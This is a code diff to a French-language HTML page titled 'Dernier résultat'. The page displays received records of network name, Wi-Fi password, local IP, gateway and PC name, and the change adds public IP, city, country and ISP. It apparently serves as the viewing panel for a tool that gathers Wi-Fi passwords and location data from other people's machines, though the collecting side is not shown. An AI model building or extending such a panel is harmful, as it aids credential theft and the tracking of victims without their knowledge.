@@ -8,9 +8,13 @@
     <h1>Dernier résultat</h1>
     <p><b>Réseau :</b> <span id="reseau">...</span></p>
     <p><b>Mot de passe :</b> <span id="mdp">...</span></p>
-    <p><b>IP :</b> <span id="ip">...</span></p>
+    <p><b>IP locale :</b> <span id="ip">...</span></p>
     <p><b>Passerelle :</b> <span id="passerelle">...</span></p>
     <p><b>Nom du PC :</b> <span id="pc">...</span></p>
+    <p><b>IP publique :</b> <span id="ip_public">...</span></p>
+    <p><b>Ville :</b> <span id="ville">...</span></p>
+    <p><b>Pays :</b> <span id="pays">...</span></p>
+    <p><b>Fournisseur :</b> <span id="fai">...</span></p>
     <p><b>Reçu le :</b> <span id="date">...</span></p>
 
     <script>
@@ -22,6 +26,10 @@
             document.getElementById("ip").innerText = data.ip || "—";
             document.getElementById("passerelle").innerText = data.passerelle || "—";
             document.getElementById("pc").innerText = data.pc || "—";
+            document.getElementById("ip_public").innerText = data.ip_public || "—";
+            document.getElementById("ville").innerText = data.ville || "—";
+            document.getElementById("pays").innerText = data.pays || "—";
+            document.getElementById("fai").innerText = data.fai || "—";
             document.getElementById("date").innerText = new Date(new Date(data.created_at).getTime() + 2 * 60 * 60 * 1000).toLocaleString("fr-FR");
         }
 
